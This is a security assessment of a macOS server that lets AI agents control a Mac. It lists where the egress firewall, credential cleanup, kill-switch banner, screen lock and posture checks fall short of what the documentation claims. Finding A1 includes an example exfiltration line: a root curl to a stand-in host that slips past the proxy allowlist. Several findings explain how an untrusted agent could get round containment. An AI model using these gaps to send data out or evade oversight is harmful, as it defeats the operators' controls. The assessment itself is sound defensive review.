# Security assessment: claims versus implementation

**Date:** 2026-10-07 · **Commit:** `dd4d515` · **Method:** source review of this
repository against its security documentation, plus the imported
`agentweave-harness v1.0.0` and `mcp-server-core` packages where a claim
depends on them. No dynamic testing, no live device, no adversarial harness.

## What this is

This document asks one question adversarially: **where does the implementation
diverge from what the documentation claims, and which real gaps are recorded
nowhere?**

It is deliberately not a balanced summary. The premise is a reader who has read
`docs/security-architecture.md`, believes it, and is deciding whether to
deploy, and who deserves to know every place that belief would be misplaced.
Findings are argued against the documentation's own words rather than described
in the abstract, because a gap the docs already name honestly is a different
kind of problem from one they paper over.

This is the macOS port of a design first assessed on Windows. The Windows
assessment's twelve Register A findings were fixed in the packages that have
since moved into agentweave-harness and mcp-server-core, so this server
inherits those fixes by construction; they are listed under Register D where
this tree lets them be re-verified. What follows is therefore mostly about what
**changed in the port**: pf instead of Windows Firewall, the keychain instead of
Credential Manager, TCC instead of a process token, root instead of an elevated
token, and the places where the Windows reasoning was carried over without
checking that macOS still bears it out.

Four registers:

| Register | Contents |
|---|---|
| **A** | Real gaps documented nowhere: the answer to the question asked |
| **B** | Claims the code contradicts |
| **C** | Stale or inconsistent documentation |
| **D** | What held up under review |

Every finding carries a `file:line` reference, verified against the tree at the
commit above. Line numbers drift; the appendix gives commands that re-locate
each one by content.

## Status

**The findings below are open at the commit named.** They were written against
the tree as the fifth milestone landed, before any remediation PR, and they are
stated in the present tense so each remains checkable. The register the
Windows document reached ("every finding remediated, in the PR that added this
document") is the target; it has not been reached here yet. What the port
already closes, by importing the fixed packages:

| Windows finding | Status on macOS |
|---|---|
| A1 destructive annotation | Closed. `Invoke`, `Click`, `Scroll`, `MultiSelect`, `Clipboard`, `Notification`, `Recording` all carry `DestructiveHint`; `Move` is the one recorded exemption; `TestEveryWriteToolIsAnnotatedDestructive` is deny-by-default (`pkg/macos/tools_test.go`) |
| A3 Scrape SSRF | Closed in `mcp-server-core/toolkit/scrape.go`: the dial goes to the vetted address, and on this platform `Scrape` is also routed through the session's egress proxy (`internal/macmcp/server.go:419-423`) |
| A4 / A5 completion and subscriptions | Closed in the harness audit and enforce middleware; this server installs both in the one `InstallReceiving` call |
| A6 posture drift without a startup rule | Refused at load by the harness policy validator; every enforcing example here carries a startup rule |
| A7 status token | `status_token_env` honoured and an empty variable fatal (`mcp-server-core/runtime/statustoken.go`) |
| A8 egress auth | An `auth_token_env` naming an empty variable is fatal (`mcp-server-core/runtime/egress.go:96-109`) |
| A11 run-context fail-open | Not inherited: `RunContext` here reads `geteuid` and the window server, neither of which has the failing-token case. A new fail-open of the same shape exists in `not-admin` (A6 below) |
| B1 "keyed by default" | The architecture document in this repo states the unkeyed default plainly |

## Resolved after this assessment

The findings below were fixed in the milestone-6 commit, in code rather than
by rewording; the registers are kept as written so the reasoning survives.

| Finding | Resolution |
|---|---|
| A2 | `RecoverCredentials` runs before every install: items under the `com.deploymenttheory.macos-mcp-server:` service prefix left by a crashed session are deleted and audited as `credentials.recovered`. |
| A6 | A failed group lookup now reports admin, so `not-admin` fails closed. |
| A7 | `locked-down.json` no longer requires `not-admin`; containment needs root, and the example says so by omission. |
| A8 | The Kill tool arms the ladder when `kill_procs` is set, matching `KillPolicyConfig`. |
| B1 | `BitLocker` reads `diskutil apfs list -plist`, one entry per Data-role or roleless volume, with `fdesetup` as the fallback. |
| B2 | The pf enforcer implements the core `EnforcementDescriber`, so `egress.enforce.applied` carries `scope`, `uid` and the anchor; the egress guide now says the audit record, not the status surface. |
| B3 | `CLAUDE.md` and the docs index describe the recorder as the `screencapture` child process it is. |
| B5 | `release.yml`, `.goreleaser.yaml` and `.github/scripts/notarize.sh` exist: Developer ID signing, notarization, syft SBOM and keyless cosign, failing loudly when a secret is missing. |

## Dynamic validation

**None.** Nothing in this document has been driven on a live Mac. The
accessibility engine tests self-skip on hosted runners, the pf suites are
opt-in behind two environment variables, and the credential injection positive
case (typing into a real `AXSecureTextField`), the System Events lock, the
`bputil` reading as root, and the kill ladder as root have not been observed.
The findings that most need a machine are A1 (watch `pfctl -sr` and a root
`curl` while the `global` tier is up), A2 (SIGKILL a session with credentials
installed and read the keychain), A4 (lock with Automation consent withheld),
and A7 (run `locked-down.json` as root and count the denials).

---

**Standing caveat.** `SECURITY.md:14-16` puts unsandboxed tool access out of
scope ("an agent with the shell toolset has the reach of the user running the
server"), and this assessment honours that. Nothing below amounts to "the Shell
tool can run a shell". The findings are about controls behaving differently
from their description.

---

## Register A: real gaps documented nowhere

Ranked by what an untrusted model driving the **shipped examples** could do
with them.

### A1. Both pf tiers exempt the uid the server's own tools run as

**New finding. Highest severity in this document.**

The scoped tier renders one block rule and the global tier one allow rule
that together decide what the agent's own tools can reach:

```
block drop out quick user <console uid>            # scoped (pf_rules.go:80)
pass out quick proto tcp to any port { … } user root # global (pf_rules.go:110-124)
```

`internal/macguard/pf.go:98` fixes `ProxyUser` to `"root"` with the comment
"the server's own proxy runs as this process, so it is root whenever enforcement
is possible at all". That is correct, and it is the problem: `Apply` refuses
unprivileged (`pf.go:89-94`), so a server that enforces is always root, and
`internal/clirunner` runs every child as the server's user. The agent's `Shell`
(`pkg/macos/shell.go:67`), `LaunchExecutable`, `Package` (`brew`,
`softwareupdate`), `Network` `test`, and any process those spawn therefore
carry uid 0 sockets, which the scoped tier never touches and the global tier
passes to every host on `allow_ports`.

pf cannot match a hostname, so the domain allowlist is enforced by the proxy
alone. A root `curl https://exfil.example/` on port 443 under `global` is
passed by pf and never sees the proxy. The Windows design does not have this
shape: there the global tier's allow rule names the server's **image**, and a
PowerShell child is a different image and stays blocked.

`docs/egress.md:35-40` is candid that the scoped tier "blocks everything the
console user runs" and that "a process running as another uid ... is not
covered". It does not say that the server is that other uid. The threat-model
row in `docs/security-architecture.md` now does (it was written alongside this
finding), and `docs/deployment-decision.md` carries it as residual risk; both
should be read as the disclosure, not as a fix. A fix needs either a second
unprivileged uid for the tool children (so pf can block it) or a Network
Extension content filter, which this binary cannot host.

### A2. A crashed session leaves its credentials in the login keychain

**New finding.**

`internal/macmcp/credentials.go:10-12` promises removal "on every shutdown
path, normal exit and kill-switch trip alike", and `provisionCredentials`
(`:344-366`) delivers exactly that through a `sync.Once`. Both are **paths
through this process**. A SIGKILL from the MCP host, an OOM kill, or a power
cut runs neither, and the item stays in the login keychain under
`com.deploymenttheory.macos-mcp-server:<target>` (`internal/macdesktop/credentials.go:87`)
with no expiry: `WriteCredential` sets no accessibility or validity attribute,
and `persist: session` is validated (`credentials.go:183-190`) but is a word in
this server's schema, not a keychain property.

The egress enforcer solves the identical problem for pf rules with a state
file written before mutation and a `Recover` pass on every start
(`internal/macguard/state.go:13-19`, `pf.go:182-211`). Credentials have no
equivalent: the next run's `WriteCredential` updates the item if the same
target is supplied (`internal/macdesktop/credentials.go:113-118`) and otherwise never looks for it.

On Windows this was the OS's job: `CRED_PERSIST_SESSION` is cleared at logoff
whatever happened to the process. `docs/credentials.md:31` describes `persist`
as "everything installed is removed again on every exit path", which is true
and which a reader will take to mean the Windows guarantee.

### A3. The security banner is a log line, and the harness thinks it is on the recording

**New finding.**

`internal/macdesktop/desktop.go:184-192`:

```go
// ShowSecurityBanner shows the security-event banner. Until the overlay lands
// it is recorded and logged, so the kill ladder's transparency step has a
// record even where it has no pixels.
```

The harness that calls it does not know that. `guardrails/contain/killaction.go`
annotates the call `// ALWAYS: human-visible, captured by the recording`, and
the Windows architecture document the port mirrors says a trip "raises a
persistent, full-width red banner drawn on-screen ... captured by the session
recording, so the event is on the video timeline". On this platform the
recording (`screencapture` driven as a child, `internal/macdesktop/recorder.go:22-28`)
shows nothing, the console user sees nothing, and only the stderr log and the
status surface's `Banner()` carry the text. The startup-blocked path at least
raises a user notification (`internal/macmcp/server.go:242`); the kill path
does not.

The code comment is honest. No document in `docs/` said it until the
architecture page written with this assessment, and the kill ladder diagram in
every earlier draft of it drew the Windows banner.

### A4. `lock` depends on two TCC consents and a user setting, and is described as needing none

**New finding.**

`internal/macguard/actuator.go:205-208` says "The Lock Screen shortcut through
System Events needs no privilege". It needs no *root*, which is what the ladder
checks. It does need the server's Accessibility grant (synthetic keystrokes) and
an **Automation** consent for System Events, which macOS prompts for the first
time `osascript` targets it and which an MDM profile can pre-approve or deny.
Without consent `osascript` fails, the code falls back to `pmset
displaysleepnow` (`:218`), and display sleep locks only when "require password
after sleep" is set. So `kill.actions.lock: true` locks the Mac only when a
consent the deployment guide does not mention has been granted, or a setting it
does not mention is on; otherwise `killaction.done{lock}` is recorded for a
display that went dark and woke unlocked.

`locked-down.json:59` arms `lock`. The ladder cannot tell the two outcomes
apart because `LockWorkstation` returns nil on either path.

### A5. `secure-boot` without root is the SIP reading

**New finding.**

`internal/macmcp/healthprobe_darwin.go:53-69`: `SecureBoot` sets `Enabled` from
`csrutil status` ("System Integrity Protection status: enabled") and then, on
arm64, refines it from `bputil -d` **when that call succeeds**. `bputil` needs
root (`:51-52` says so), so an unprivileged server reports boot security as
whatever SIP reports, which is exactly what `DeviceGuard` returns as
`VBSRunning` (`:89-92`). Two signals, one fact.

`docs/policy-config.md` lists the source as "`bputil -d`, `csrutil status`"
and the reading as "Apple silicon boot security at Full Security". A Mac at
Reduced Security with SIP on passes `secure-boot` under every unprivileged
deployment, and `enterprise.json:28-31` and `secure.json:30-33` both gate
destructive tools on it. The right reading of an unprivileged `secure-boot` is
"SIP on", and a policy author needs to be told that.

### A6. `not-admin` passes when the group lookup fails

**New finding.** The macOS analogue of the Windows A11, and the same direction.

`internal/macmcp/systemprobe.go:142-158`: `IsAdmin` returns `false` on a
`user.Current()` or `GroupIds()` error. The harness's `not-admin` signal reads
`!IsAdmin()`, so an error produces a **pass** on a signal that `enterprise.json`
(warn) and `locked-down.json` (deny on every call) require. The codebase's own
rule elsewhere is that a signal which errors is scored at the rule's full
severity, and the health probes in the file beside this one follow it; this
one does not.

### A7. `locked-down.json` cannot both contain and admit on macOS

**New finding.**

Two facts compose:

1. Root is a member of `admin`: `id -G root` lists gid 80, and
   `dscl . -read /Groups/admin GroupMembership` names `root`. `IsAdmin`
   (`systemprobe.go:150-156`) matches on `"80"`, so an elevated server fails
   `not-admin`.
2. `locked-down.json:29-33` requires `not-admin` (`ttl: 0s`) on `toolset: "*"`
   with `on_fail: "deny"`, and `:58-59` arms `isolate` and `lock`, and
   `:43-48` a rate limit at `on_exceed: "kill"`.

Run as root, so that isolation can actually fire, every tool call is denied by
`baseline-posture`. Run unelevated, the ladder records
`killaction.skipped{isolate, "not elevated"}` on the trip the document armed.
The example that is meant to show the strictest posture is unsatisfiable as
written, and the `policy test` fixtures do not catch it because they run
against fixture device states, not against the fact that root is an admin.

The same tension is latent in every document that pairs `not-admin` with a pf
tier or `isolate`, and `docs/policy-config.md` describes `not-admin` as "not a
member of the `admin` group (gid 80)" without noting who that includes.

### A8. The Kill tool's arming check omits `kill_procs`

**New finding, low severity, safe direction.**

`internal/macmcp/server.go:586`:

```go
if devicePolicy.Kill.Actions.Isolate || devicePolicy.Kill.Actions.Lock || devicePolicy.Kill.Actions.Shutdown {
    stopSession = kill.Trip
}
```

A document whose only containment is `kill_procs` leaves the agent-facing
`Kill` tool on `StopGracefully`, so a session the operator meant to end with
process termination ends without it when the agent asks. The authoritative
triggers still route through `OnTrip`, so this is an inconsistency rather than
a bypass; it is recorded because the comment above the line says the condition
is "when the policy configures containment", and one of the four actions is not
counted.

### A9. The unelevated `Shutdown` branch is unreachable from the ladder

**New finding, cosmetic.**

`internal/macguard/actuator.go:238-247` falls back to `tell application
"System Events" to shut down` when the process is not root, "which may prompt
the console user". The harness only calls `Shutdown` when `elevated` is true
(`killaction.go`, the shutdown block), so that branch runs only from a direct
call. It is dead code on the ladder and a prompt-raising path if anything else
ever calls it; worth deleting or documenting as test-only.

---

## Register B: claims the code contradicts

### B1. "FileVault on for every APFS volume, one entry per volume"

> `bitlocker` | ... | FileVault on for every APFS volume, one entry per volume |
> `fdesetup status`, `diskutil apfs list -plist`
> `docs/policy-config.md`, signal table

`internal/macmcp/healthprobe_darwin.go:107-114` runs `fdesetup status` and
returns exactly one `BitLockerVolume{Mount: "/"}`. There is no `diskutil`
invocation anywhere in `internal/` or `pkg/`. A data volume that is not
encrypted does not fail the signal, and the document says it does. The error is
in the unsafe direction: an operator who reads the table believes a stricter
check than the one performed.

### B2. "The status surface and the audit record say `scope: user`"

> the status surface and the audit record say `scope: user` so nobody reads it
> as per-application
> `docs/egress.md:37-38`

Neither does. The status snapshot's egress block (`mcp-server-core/runtime/egress.go:319-333`)
carries `Enforcement: cfg.Enforcement()`, which is the policy's word
(`scoped`), with no uid or scope field. The audit record `egress.enforce.applied`
(`runtime/egress.go:156-161`) carries `enforcement` and the count of
applications requested. The only places the uid scoping is visible are a
`logger.Warn` at `internal/macguard/pf.go:108` and the `scoped_uid` field of
`egress-state.json`, which is an internal recovery file. An operator checking
the status endpoint to confirm the tier sees `scoped` and has no way to learn,
from that surface, that it means "the console user".

### B3. "Session recording with ScreenCaptureKit"

> `recording.md` | Session recording with ScreenCaptureKit
> `docs/README.md:12`

and `CLAUDE.md` ("Screenshot and recording capture are deliberately
thread-agnostic (ScreenCaptureKit is asynchronous ...)"). The recorder
(`internal/macdesktop/recorder.go:22-28`) is `screencapture(1)` in video mode,
driven as a child process and finalised on SIGINT; its own comment says
ScreenCaptureKit is "the in-process alternative" not yet taken. Whether the
capture goes through ScreenCaptureKit matters for the security reading in two
ways: the Screen Recording grant is checked for this binary's identity either
way, but a child process is what `kill_procs` could terminate and what a
`global` tier could, in principle, affect, neither of which applies to an
in-process stream.

### B4. "The kill ladder's banner is captured by the recording"

The harness comment at the banner call (`guardrails/contain/killaction.go`,
"ALWAYS: human-visible, captured by the recording") is a Windows claim that the
harness makes for every platform. On this one it is false; see A3. Recorded
here as a contradiction because the harness is an imported dependency whose
comments a reviewer of this repo will read as describing this repo.

### B5. "Releases are Developer ID signed and notarized, with a CycloneDX SBOM and a keyless cosign signature"

> `SECURITY.md:20-23`

There is no release workflow in the tree at this commit.
`.github/workflows/` holds `release-please.yml`, which cuts tags and changelog
entries, and the build, lint and dependency workflows; `release.yml`, which
`CLAUDE.md` says "fails rather than falling back to ad-hoc", does not exist
yet. The README's status line is honest about it ("the signed release pipeline
land[s] with v1.0.0"); `SECURITY.md` is written in the present tense. A
researcher following the vulnerability-disclosure page's "verification steps
are on every release" will find no release.

---

## Register C: stale or inconsistent documentation

Low severity individually. Listed because the pattern, several documents
drifting from a moving codebase in the same direction, is what lets B-register
errors survive.

| Claim | Source | Actual |
|---|---|---|
| "The list grows milestone by milestone toward parity with windows-mcp-server's 35" | `pkg/macos/tools.go:11-12` | Parity reached; `TestExpectedToolCount` pins 35 (`tools_test.go:75`) |
| Eight linked guides: `getting-started`, `permissions`, `toolsets-and-personas`, `recording`, `journeys`, `plan-and-apply`, `mcp-compliance`, `deployment` | `docs/README.md` | Not in the tree. The index says so explicitly ("a link to a missing file means the feature is not in this build yet"), but `README.md:44` sends the reader to `docs/permissions.md` "once it lands" while `CLAUDE.md` and this document cite it as existing |
| "Secure Boot → Apple silicon boot security (`bputil`/`csrutil`)" with no privilege note | `CLAUDE.md`, posture-probes paragraph | `bputil` needs root; unprivileged the signal is SIP (A5) |
| "the Windows implementation lives in actuator_windows.go and a no-op fake in actuator_stub.go" | harness `guardrails/contain/killaction.go`, `SystemActuator` doc | The macOS actuator lives in this repo (`internal/macguard/actuator.go`); the harness comment predates the port |
| `Shutdown` "otherwise System Events is asked, which may prompt the console user" | `internal/macguard/actuator.go:224-225` | Unreachable from the ladder (A9) |
| "the Lock Screen shortcut through System Events needs no privilege" | `internal/macguard/actuator.go:205-206` | Needs Accessibility and Automation consent (A4) |
| `persist: session`: "everything installed is removed again on every exit path" | `docs/credentials.md:31` | True of exit paths; a crash is not one (A2) |
| "Window titles from the window server need Screen Recording; titles come from the accessibility tree, which needs only Accessibility" | `CLAUDE.md`, gotchas | Consistent with `permissions.go:30-35`; listed only because `docs/permissions.md`, which the paragraph defers to, does not exist |

### The structural cause

The port carried the Windows documents' *structure* faithfully and their
*reasoning* mostly, but several load-bearing sentences were true only because
of a Windows mechanism that has no counterpart here. "The server's image needs
an allow rule" assumed pf could name an image (A1). "Removed on every exit
path" assumed the OS clears session credentials (A2). "Captured by the
recording" assumed a drawn banner (A3). "Needs no privilege" assumed privilege
is the only gate on input, when TCC is another (A4). Each was carried into a
comment or a doc without the question "does macOS still make this true" being
asked. The honesty of the code comments (`desktop.go:184-186`, `pf.go:21-25`,
`pf_rules.go:21-24`) is high; it is the documents and the harness's shared
comments that lag.

---

## Register D: what held up

Reviewed and found sound. This register exists so the rest is read as an audit
rather than a hit list, and because several of these are stronger than the
Windows counterpart they replace.

- **Middleware ordering.** One `InstallReceiving` call built by
  `runtime.ReceivingChain` (`internal/macmcp/server.go:546-565`): audit,
  telemetry, the four rug-pull surfaces, then policy. Under an enforcing harness
  the chain collapses to audit and the baselines are shed, which is the right
  shape for a server that cannot vouch for itself.
- **Argv only, never a shell.** `internal/clirunner` rebuilds `PATH` from
  `/etc/paths` and the Homebrew prefix, withholds every `MACOS_MCP_*` variable
  from children, bounds every call, and has exactly one interpreter path
  (`RunScript`, a closed set, no rc files) used only by `Shell`. The probe's
  `RunShell` is a **command table** that answers `dsregcmd /status` and refuses
  everything else (`systemprobe.go:69-77`). I traced every CLI-touching path in
  `internal/macguard`, `internal/macmcp` and `pkg/macos` and found no model
  string interpolated into a command line.
- **pf state discipline.** State before mutation, on every path including
  isolation (`actuator.go:74-87`); `Recover` on every start even with egress
  off (`runtime/egress.go:63-72`); atomic state writes; a `pfctl -E` token so
  the run releases only the reference it took; block rendered first and `quick`
  passes after for pf's last-match semantics; `Suspend` keeps only the blocks.
  All pinned by `TestApplyWritesStateBeforeAnyChange`,
  `TestRecoverUndoesWhatTheFileNames`, `TestSuspendedRulesKeepOnlyTheBlock`,
  `TestGlobalAllowRulesCoverTheMachineEssentials` and
  `TestRenderRulesScopedTierIsUIDScoped`.
- **Isolation is observed, not assumed.** `IsolateNetwork` reads the anchor
  back with `pfctl -sr` and the ladder records that in `killaction.done`, so
  "isolate ran" and "isolate took effect" are separate claims (`actuator.go:99-102`).
- **The never-read invariant, in Go.** `readSecretUnits` is unexported, has one
  caller, and returns UTF-16 units (`internal/macdesktop/credentials.go:229-247`);
  `requireMaskedFocus` runs on the main thread after the optional click and
  immediately before the keystrokes, failing closed on every branch
  (`:156-172`, `:197-201`); the tool returns a band, not a count
  (`pkg/macos/credentials.go:272-283`); `TestCredentialsToolNeverReturnsSecrets`
  pins the three modes.
- **The credentials file check is real.** Unix mode bits and ownership against
  the effective uid (`credfileperm_darwin.go:27-45`), with the `chmod 600`
  remedy in the message; a BOM is tolerated and wiped with the rest of the
  buffer; secrets are decoded into wipeable bytes on the common path.
- **The exposure rule is correct for this platform.** `shell` can run
  `security find-generic-password -w`, `filesystem` can copy
  `~/Library/Keychains/login.keychain-db`, and perception toolsets become risky
  only when a credential opts out of the masked check
  (`credexposure.go:26-43`). Refusal is audited; acknowledgement is logged and
  audited; `enterprise.json` acknowledges `shell` deliberately.
- **Secrets leave the environment twice.** `ScrubSecretEnv` clears every
  `MACOS_MCP_*` secret, the egress token variable and the status token
  variable after each is read, and `clirunner` withholds the prefix from
  children regardless.
- **Startup admission before anything.** Policy, then audit, then the engine,
  then admission, and only then the inventory and credentials
  (`server.go:151-305`); a denied device gets a banner, a notification, an
  audited reason and a non-zero exit. The no-session case is **detected** via
  the window server, not declared, and a persona is refused rather than
  silently narrowed.
- **A persona cannot be widened by `--tools`** (`server.go:276-292`,
  `ErrPersonaToolBypass`), audited as `tools.persona_bypass.denied`.
- **Anchoring is defence-in-depth, never a gate**, and `anchorOnce` refuses to
  grow the chain on an idle tick (`anchor.go:73-87`).
- **`Scrape` goes through the session's proxy** (`server.go:419-423`), which
  closes the Windows document's "only when `HTTPS_PROXY` is set" caveat.
- **Path normalisation does what it says.** `NormalizePath` folds `~`,
  `/private/{etc,var,tmp}`, symlinks and case (`pkg/macos/dependencies.go:56-90`)
  and its own comment names hard links and firmlinks as what it cannot fold.
- **Cross-platform naming is pinned.** 35 tools, 13 toolsets with the Windows
  ids, the four renames enumerated and the Windows subsystem names refused
  (`tools_test.go:84-128`), so a policy document means the same thing on both
  platforms, which is the whole premise of sharing the harness.
- **The ladder's ordering** is inherited unchanged, and `Finalize` here removes
  credentials and suspends egress before closing the engine
  (`server.go:431-440`), which is the right order: containment must not leave
  session credentials on the machine.

---

## Summary

**Nine findings recorded nowhere** (Register A), of which A1 is the one to act
on first: the enforcement tiers that the document says stop the proxy being
bypassed do not apply to the uid the agent's shell runs as, because that uid is
root and root is the exemption. A2 is the one to act on second, because it is
the easiest to fix in the shape the code already uses for pf: a recovery record
for installed credentials, read on every start.

**Five contradicted claims** (Register B), of which B1 (FileVault "per volume")
is in the unsafe direction and B2 (`scope: user` on the status surface) is the
one an operator will actually look for and not find.

**Eight stale claims** (Register C) and one structural cause: sentences that
were true because of a Windows mechanism survived the port into comments and
documents that macOS does not bear out.

Two observations on the shape of all this. First, the code is more honest than
the documents. `desktop.go` says the banner has no pixels; `pf.go` says pf
cannot match an executable; `actuator.go` says `bputil` needs root. The
findings are mostly where a document, or an imported comment, did not repeat
what the code beside it admits. Second, root changes the trust geometry. On
Windows, elevation buys enforcement without changing who the tools are; on
macOS it makes the agent's shell root, exempts it from pf, and fails
`not-admin`. Every example that arms containment should be re-read with that in
mind, and the deployment guide, when it lands, should say in its first
paragraph which uid the server is meant to run as.

If a single next step is wanted: A1, A2 and A7 are each testable in an
afternoon on a disposable Mac, and B1 and B2 are verifiable in one `grep` each.

---

## Appendix: re-verifying these findings

Line numbers drift. Each finding is re-locatable by content:

```sh
# A1: the uid the pf tiers exempt, and who runs the tool children
grep -n 'ProxyUser\|user root\|user %d' internal/macguard/pf.go internal/macguard/pf_rules.go
grep -n 'func Elevated\|ErrNotElevated' internal/macguard/*.go
grep -n 'RunScript' pkg/macos/shell.go internal/clirunner/clirunner.go

# A2: credential removal paths, and the absence of a recovery pass
grep -n 'once.Do\|removeCredentials' internal/macmcp/credentials.go
grep -rn 'Recover' internal/macguard/pf.go internal/macmcp/*.go | grep -v _test

# A3 / B4: the banner has no pixels
grep -n 'func (d \*Desktop) ShowSecurityBanner' -A 8 internal/macdesktop/desktop.go
grep -rn 'captured by the recording' "$(go env GOMODCACHE)"/github.com/deploymenttheory/agentweave-harness@*/guardrails/contain/killaction.go

# A4: lock path and fallback
grep -n 'func (a \*Actuator) LockWorkstation' -A 14 internal/macguard/actuator.go

# A5: secure-boot collapses to SIP without root
grep -n 'func (p \*systemProbe) SecureBoot' -A 16 internal/macmcp/healthprobe_darwin.go

# A6 / A7: IsAdmin fail-open and root in admin
grep -n 'func (p \*systemProbe) IsAdmin' -A 16 internal/macmcp/systemprobe.go
id -G root | tr ' ' '\n' | grep -x 80
grep -n 'not-admin\|"isolate"\|"lock"' policy/examples/locked-down.json

# A8: the Kill tool arming condition
grep -n 'stopSession = kill.Trip' -B 2 internal/macmcp/server.go

# B1: FileVault reads one volume
grep -n 'func (p \*systemProbe) BitLocker' -A 8 internal/macmcp/healthprobe_darwin.go
grep -rn 'diskutil' internal pkg || echo 'no diskutil call'

# B2: no scope field on the status surface or the audit record
grep -rn 'scope' ../mcp-server-core/runtime/egress.go || echo 'no scope field'
grep -n 'uid-scoped' internal/macguard/pf.go

# B3: the recorder is screencapture(1)
sed -n 18,28p internal/macdesktop/recorder.go

# B5: no release workflow in the tree
ls .github/workflows

# C: authoritative counts
grep -n 'const want' pkg/macos/tools_test.go     # tools: 35
ls policy/examples/*.json | wc -l                # examples: 7
```
